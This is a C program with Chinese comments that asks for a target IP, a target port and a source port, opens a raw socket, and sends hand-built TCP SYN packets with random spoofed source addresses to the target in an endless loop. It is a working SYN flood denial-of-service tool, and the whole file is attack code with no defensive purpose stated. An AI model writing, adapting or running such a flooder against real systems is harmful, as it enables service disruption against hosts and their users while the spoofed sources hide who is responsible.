#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

void send_data(int sfd, struct sockaddr_in *addr, int port);

int main( int argc, char *argv[] ) {
	char ip[32]; // 目标IP
	int dport;   // 目标端口
	int sport;   // 源端口
	int sfd;
	struct sockaddr_in addr;

	memset(&addr, 0x00, sizeof(struct sockaddr_in));
	printf("目标IP:"); scanf("%s", ip);
	printf("目标端口:"); scanf("%d", &dport);
	printf("源端口:"); scanf("%d", &sport);
	
	addr.sin_family = AF_INET;
	inet_aton(ip, &addr.sin_addr);
	addr.sin_port = htons(dport);
	if ( (sfd=socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1 ) {
		perror("socket");
		exit(EXIT_FAILURE);
	}
	int on = 1;
	setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
	send_data(sfd, &addr, sport);
}

u_short checksum(u_short *data, int len) {
	u_long  sum = 0;

	for ( ; len > 1; len-=2 ) { // 以16位为单位进行加
		sum += *data++;
		if ( sum & 0x80000000 ) 
			sum = (sum&0xffff) + (sum>>16);
	}

	if ( len == 1 ) { // 最后剩下一个
		u_short i = 0;
		*(u_char*)&i = *(u_char*)data;
		sum += i;
	}

	while ( sum >> 16 ) // 高16位如果有1，继续计算
		sum = (sum&0xffff) + (sum>>16);
	return (sum == 0xffff) ? sum : ~sum;
}


void send_data(int sfd, struct sockaddr_in *addr, int port) {
	char buf[100];
	struct iphdr *ip;
	struct tcphdr *tcp;
	int head_len;
	
	head_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	memset(buf, 0x00, sizeof(buf));

	ip = (struct iphdr*)buf;
	ip->version = IPVERSION;   
	ip->ihl = sizeof(struct ip)>>2;
	ip->tos = 0;                  
	ip->tot_len = htons(head_len);
	ip->id = 0;
	ip->frag_off = 0;
	ip->ttl = MAXTTL;            
	ip->protocol = IPPROTO_TCP;  
	ip->check = 0;              
	ip->daddr = addr->sin_addr.s_addr; 

	tcp = (struct tcphdr*)(buf+sizeof(struct iphdr));
	tcp->source = htons(port);
	tcp->dest = addr->sin_port; 
	tcp->seq = random();       
	tcp->ack_seq = 0;
	tcp->doff = 5;
	tcp->syn = 1;

	while ( 1 ) {
		ip->saddr = random();
		tcp->check = checksum((u_short*)(buf+sizeof(struct iphdr)), sizeof(struct tcphdr));
		sendto(sfd, buf, head_len, 0, (struct sockaddr*)addr, (socklen_t)sizeof(struct sockaddr_in));
	}
}

